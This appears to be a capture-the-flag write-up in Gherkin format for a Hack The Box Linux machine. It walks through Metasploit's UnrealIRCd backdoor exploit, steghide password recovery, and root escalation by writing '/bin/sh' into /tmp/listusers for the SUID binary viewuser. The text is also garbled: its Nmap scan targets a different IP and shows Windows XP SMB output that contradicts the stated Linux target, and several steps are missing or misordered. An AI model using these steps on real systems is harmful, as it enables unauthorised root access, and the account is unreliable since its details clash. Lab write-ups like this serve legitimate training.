## Version 2.0
## language: en

Feature:
  Site:
    Hack The Box
  Category:
    CTF
  User:
    aramirez95
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Metasploit      | 5.0.73-dev  |
    | Steghide        | 0.5.1       |
  Machine information:
    Given I am accessing the machine 10.10.10.117
    And is running on Linux

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -p- -sV 10.10.10.4 --open
    """
    Then I get the output
    """
    Starting Nmap 7.80 ( https://nmap.org ) at
    2020-02-24 20:57 -05
    Nmap scan report for 10.10.10.4
    Host is up (0.18s latency).
    Not shown: 997 filtered ports
    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows
    netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server
    Service Info: OSs: Windows, Windows XP; CPE:
    cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
    """
    And I can see that it has a service http and irc

  Scenario: success
    Given the machine has SMB and NetBios services
    Then he decided to run the port 80
    And only contains a website with an image
    Then I decide to download the image to scan it with:
    """
    $ steghide extract -sf irked.jpg
    """
    Given the photo has a password we cannot scan it
    Then I decide to run metasploit
    And I run an exploit
    """
    msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor
    """
    Then I configure the RHOST
    And the remote ip is as follows
    """
    msf5> set RHOSTS 10.10.10.117
    """
    And I configure the RPORT
    """
    msf5> set RPORT 8067
    """
    Then I execute an instruction to run the exploit
    And serves to run the exploit
    """
    msf5> exploit
    """
    And I can execute commands
    Then I use one to go home
    """
    ~$ cd /home
    """
    Then I see that there is a user named djmardov
    And I'm going to stop at that user
    """
    ~/home$ cd djmardov
    """
    Then I use an instruction
    And it serves to go to documents
    """
    ~/home/djmardov$ cd Documents
    """
    Then I see that there is a user.txt
    And not have permissions
    Then I execute command
    """
    ~/home/djmardov/Documents$ ls -la
    """
    Then I see that there is a file named backup
    And has a password
    """
    $ JPupDOWNdownLRlrBAbaSSss
    """
    Then I execute command
    And it serves to decrypt the file
    """
    $ steghide extract -sf irked.jpg
    """
    Then we will place the backup password
    And I see that there is a file named
    """
    $ cat pass.txt
    """
    Then I run the SSH with the pass.txt
    And I execute command
    """
    ~/Documents$ find / -perm -u=s -type=f 2>/dev/null
    """
    Then I execute an instruction
    And it is to make a fork
    """
    ~/Documents$ echo '/bin/sh' > /tmp/listusers
    """
    Then I must grant permissions
    And it is for the following directory:
    """
    ~/Documents$ chmod 777 /tmp/listusers
    """
    Then I execute the file
    And it is to configure and test user permissions:
    """
    ~/Documents$ /usr/bin/viewuser
    """
    Then I'm going to stop at that root
    And I can see that there is a file with the flag
    """
    # cd /root
    """
    And finally I get the FLAGS with cat
